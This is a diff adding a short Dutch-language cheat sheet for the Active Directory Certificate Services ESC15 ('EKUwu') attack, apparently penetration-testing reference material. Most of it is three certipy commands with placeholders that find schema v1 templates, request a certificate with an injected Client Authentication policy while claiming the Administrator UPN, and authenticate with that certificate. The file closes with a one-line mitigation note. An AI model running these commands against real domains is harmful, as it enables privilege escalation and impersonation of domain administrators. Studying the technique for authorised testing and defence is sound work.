@@ -1,0 +1,24 @@
+# AD CS ESC15 (EKUwu) — Schema v1 Application Policy injection
+# Schema v1 templates verwerken de msPKI-Certificate-Application-Policy attribuut
+# niet correct, waardoor een aanvrager de EKU kan overschrijven
+#
+# === Vereisten ===
+# - Template met schema versie 1
+# - Enrollment rechten op de template
+# - ENROLLEE_SUPPLIES_SUBJECT of andere ESC1-achtige conditie
+#
+# === Voorbeelden ===
+
+# Zoek kwetsbare v1 templates
+certipy find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout | grep -A5 "Schema Version.*: 1"
+
+# Certificaat aanvragen met geïnjecteerde Application Policy (Client Authentication)
+certipy req -u USER@DOMAIN -p 'PASS' -ca CA_NAME -target DC_FQDN -template TEMPLATE_NAME -upn Administrator@DOMAIN --application-policies "1.3.6.1.5.5.7.3.2"
+
+# Authenticeren met verkregen certificaat
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+
+# Noot: ESC15 werkt alleen op templates met schema versie 1
+# Noot: De application policy OID 1.3.6.1.5.5.7.3.2 = Client Authentication
+# Noot: Template schema versie is zichtbaar in certipy find output
+# Noot: Mitigatie: Upgrade templates naar schema v2+, beperk enrollment
